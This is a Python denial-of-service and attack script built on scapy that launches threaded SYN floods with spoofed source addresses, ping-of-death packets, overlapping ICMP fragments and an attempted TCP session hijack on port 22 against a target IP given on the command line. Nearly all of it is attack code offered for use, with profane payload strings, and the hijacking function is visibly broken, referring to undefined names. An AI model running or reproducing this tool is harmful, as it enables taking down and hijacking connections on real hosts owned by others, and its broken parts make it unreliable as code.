from time import sleep
import os 
try:
    from scapy.all import *
except:
    print("use:\n pip3 install scapy\nor\npip install scapy \nif you are a windows user use:\npy -m pip install scapy")
from threading import Thread
from random import randint
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('-g', '--gateway', help="the address of your gateway")
parser.add_argument('-w', '--worker', help="the number of workers to work.", type=int)
parser.add_argument('-t', '--target', help="Ip of the target for attack.")
parser.add_argument('-p', '--targetport', help="target port for attacking.", type=int)

args = parser.parse_args()
target = args.target
counter = args.worker
ptarget = args.targetport
gateway = args.gateway

if target == None :
    parser.print_help()

def TCPHijacking(target, gateway):
    port = 22
    dip = target
    filter = 'host' + dip + 'and port '+ str(port)
    def Hijack(p):
        if p[IP].src == dip and p[IP].dst == gateway:
            print("Seq:"+ str(p[TCP].seq)+"| Ack:"+str(p[TCP].ack))
            print("Hijack Seq:"+str(p[TCP].ack)+"| Hijack Ack:"+str(p[TCP].seq))
            ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
            ip = IP(src=p[IP].dst,
                    dst=p[IP].src,
                    ihl=p[IP].ihl,
                    len=p[IP].len,
                    flags=p[IP].flags,
                    frag=p[IP].frag,
                    ttl=p[IP].ttl,
                    proto=p[IP].proto,
                    id=29321)
            tcp = TCP(sport=p[TCP].dport,
                      dport=p[TCP].sport,
                      seq=p[TCP].ack,
                      ack=p[TCP].seq,
                      dataofs=p[TCP].dataofs,
                      reserved = p[TCP].reserved,
                      flags='PA',
                      window=p[TCP].window,
                      options=p[TCP].options)
            hijack = ehter/ip/tcp/(cmd+'\n')
            rcv = sendp(hijack)
        sniff(count=0,
              prn= lambda p: hijack(P),
              filter = filter,
              lfilter = lambda f:(f.haslayer(IP) & f.haslayer(TCP) &  f.haslayer(Ether)))

            

def RandIp():
    i1,i2,i3,i4=randint(1,255),randint(1,255),randint(1,255),randint(1,255)
    ip = f"{i1}.{i2}.{i3}.{i4}"
    return ip

def PingOfDeath(target):
    while True:
        send(fragment(IP(dst=target)/ICMP()/("X"*60000)))
        sleep(0.2)

def Fragment(target):
    frag1 = IP(dst=target,
               id=12345,
               proto=1,
               frag=0,
               flags=1
               )/ICMP(type=8,
                      code=0,
                      chksum=0xdce8
                      )
    frag2 = IP(dst=target,
               id=12345,
               proto=1,
               frag=2,
               flags=1)/"FUCKYIUMOTHERFUCKER"
    frag3 = IP(dst=target,
               id=12345,
               proto=1,
               frag=1,
               flags=0)/"HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"
    frag4 = IP(dst=target,
               id=12345,
               proto=1,
               frag=3,
               flags=0) / "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"
    frag5 = IP(dst=target,
               id=12345,
               proto=1,
               frag=4,
               flags=0) / "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"
    frag6 = IP(dst=target,
               id=12345,
               proto=1,
               frag=5,
               flags=0) / "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH"
    a = sniff(filter="icmp")
    while True:
        send(frag4)
        send(frag5)
        send(frag6)
        send(frag1)
        send(frag2)
        send(frag3)
        a.nsummary()
        print(f'''
        {a[0]}\n
        {a[1]}\n
        {a[2]}\n
        {a[3]}\n
        {a[4]}\n
        {a[5]}\n
        {a[6]}\n
        {a[7]}\n
            ''')
        sleep(0.9)


def SYN_Floodin(target_ip, target_port):
    ip = IP(src=RandIp(), dst=target_ip)
    tcp = TCP(sport=randint(1000, 65000), dport=target_port, flags='S')
    raw = Raw(b"Fuck You"*1024)
    p = ip / tcp / raw
    while True:
        send(p, loop=1, verbose=0)
        sleep(15)


def StartWorking(target, ptarget):
    workers = 0
    for _ in range(counter):
        syn_floodin = Thread(target=SYN_Floodin, args=[target, ptarget, ])
        pof = Thread(target=PingOfDeath, args=[target, ])
        TcpHijacking = Thread(target=TCPHijacking, args=[target, gateway, ])
        fragmet = Thread(target=Fragment, args=[target, ])
        syn_floodin.start()
        pof.start()
        TcpHijacking.start()
        fragmet.start()
        workers += 1
        print("[+] worker {} is start working .....".format(workers))

StartWorking(target, ptarget)